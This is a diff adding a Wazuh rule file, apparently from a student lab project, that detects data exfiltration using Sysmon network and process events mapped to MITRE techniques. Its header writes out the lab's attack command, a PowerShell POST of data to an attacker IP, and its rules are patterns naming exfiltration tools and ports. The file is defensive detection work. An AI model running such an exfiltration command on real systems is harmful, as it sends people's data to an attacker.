@@ -1,0 +1,135 @@
+<!--
+  ============================================================
+  Rule File : exfiltration.xml
+  Author    : Teffat Abderahim
+  Project   : Smart Threat Detection with Wazuh and AI
+  Team      : ESI Sidi Bel Abbes — CyS 2SC — 2025/2026
+  MITRE     : T1041 — Exfiltration Over C2 Channel
+              T1048.003 — Exfiltration Over Alternative Protocol
+  Tactic    : Exfiltration
+  IDs       : 100090–100094
+  Attack    : Invoke-WebRequest -Uri http://192.168.109.158/exfil -Body $data -Method POST
+  ============================================================
+
+  Detection Logic:
+  Data exfiltration occurs when an attacker sends collected data
+  out of the network to their controlled server. In this lab, the
+  attacker uses PowerShell or curl to POST data to the Kali machine.
+
+  Detection approach — two layers:
+
+  Layer 1 — Network (Sysmon ID 3):
+    Script engines (PowerShell, certutil, bitsadmin) making
+    outbound connections to the Kali IP or on unusual ports.
+    These tools are commonly abused for exfiltration because
+    they can speak HTTP natively.
+
+  Layer 2 — Process behavior (Sysmon ID 1):
+    The command line of the exfiltration command often contains
+    keywords: -Method POST, Invoke-WebRequest with a body,
+    certutil -encode (base64 before exfil), etc.
+
+  The combination of suspicious process + outbound connection
+  to attacker IP is a very high-confidence exfiltration signal.
+-->
+
+<group name="exfiltration,data_theft,c2,windows">
+
+  <!--
+    RULE 100090 — Sysmon ID 3: scripting tool connecting to Kali IP
+    Logic : PowerShell, certutil, bitsadmin, or curl making an
+            outbound connection to the known attacker machine.
+            These tools have no legitimate reason to contact Kali.
+    Level : 12
+  -->
+  <rule id="100090" level="12">
+    <if_group>windows</if_group>
+    <field name="win.system.eventID">^3$</field>
+    <match>(?i)(powershell\.exe|certutil\.exe|bitsadmin\.exe|curl\.exe|wget\.exe)</match>
+    <match>192.168.109.158</match>
+    <description>Exfiltration Attempt: $(win.eventdata.image) connecting to Kali attacker 192.168.109.158:$(win.eventdata.destinationPort) — possible data exfiltration</description>
+    <mitre>
+      <id>T1041</id>
+    </mitre>
+    <group>exfiltration,attacker_ip_connection,high_severity</group>
+  </rule>
+
+  <!--
+    RULE 100091 — Sysmon ID 1: PowerShell HTTP POST command
+    Logic : Invoke-WebRequest or Invoke-RestMethod with -Method POST
+            and a -Body parameter is the exact exfiltration syntax.
+            The -Body flag means data is being sent, not received.
+    Level : 13
+  -->
+  <rule id="100091" level="13">
+    <if_group>windows</if_group>
+    <field name="win.system.eventID">^1$</field>
+    <match>(?i)(Invoke-WebRequest|Invoke-RestMethod|iwr\s|irm\s)</match>
+    <match>(?i)(-Method\s+POST|-Body\s)</match>
+    <description>HTTP POST Exfiltration: PowerShell sending data via POST — $(win.eventdata.commandLine)</description>
+    <mitre>
+      <id>T1041</id>
+      <id>T1059.001</id>
+    </mitre>
+    <group>exfiltration,http_post,powershell</group>
+  </rule>
+
+  <!--
+    RULE 100092 — Sysmon ID 1: certutil encoding (pre-exfil prep)
+    Logic : Attackers often base64-encode data with certutil -encode
+            before exfiltrating to avoid content inspection.
+            Certutil encoding a non-certificate file is suspicious.
+    Level : 10
+  -->
+  <rule id="100092" level="10">
+    <if_group>windows</if_group>
+    <field name="win.system.eventID">^1$</field>
+    <match>(?i)certutil</match>
+    <match>(?i)(-encode|-decode)</match>
+    <description>Certutil Encoding: $(win.eventdata.commandLine) — possible data encoding before exfiltration</description>
+    <mitre>
+      <id>T1027</id>
+      <id>T1041</id>
+    </mitre>
+    <group>exfiltration,encoding,certutil</group>
+  </rule>
+
+  <!--
+    RULE 100093 — Chain: file access + outbound connection
+    Logic : If a process accesses sensitive files AND then makes
+            an outbound connection within 60 seconds, that is
+            the collect-then-exfil pattern.
+            Chains file create (Sysmon 11) with network (Sysmon 3).
+    Level : 14
+  -->
+  <rule id="100093" level="14" frequency="2" timeframe="60">
+    <if_matched_sid>100030,100090</if_matched_sid>
+    <description>Exfiltration Chain: file access followed by outbound connection — data collection and exfiltration pattern detected</description>
+    <mitre>
+      <id>T1041</id>
+      <id>T1005</id>
+    </mitre>
+    <group>exfiltration,collect_and_send,high_severity</group>
+  </rule>
+
+  <!--
+    RULE 100094 — Sysmon ID 3: large outbound on non-standard port
+    Logic : Exfiltration sometimes happens over non-standard ports
+            to avoid HTTP inspection. Any scripting tool sending
+            data outbound on ports outside 80/443 is suspicious.
+    Level : 11
+  -->
+  <rule id="100094" level="11">
+    <if_group>windows</if_group>
+    <field name="win.system.eventID">^3$</field>
+    <match>(?i)(powershell\.exe|certutil\.exe|bitsadmin\.exe)</match>
+    <match>Initiated: true</match>
+    <match>(?i)(DestinationPort: 8080|DestinationPort: 8443|DestinationPort: 4444|DestinationPort: 1337)</match>
+    <description>Exfiltration on Non-Standard Port: $(win.eventdata.image) → $(win.eventdata.destinationIp):$(win.eventdata.destinationPort) — possible data exfiltration channel</description>
+    <mitre>
+      <id>T1048.003</id>
+    </mitre>
+    <group>exfiltration,non_standard_port</group>
+  </rule>
+
+</group>
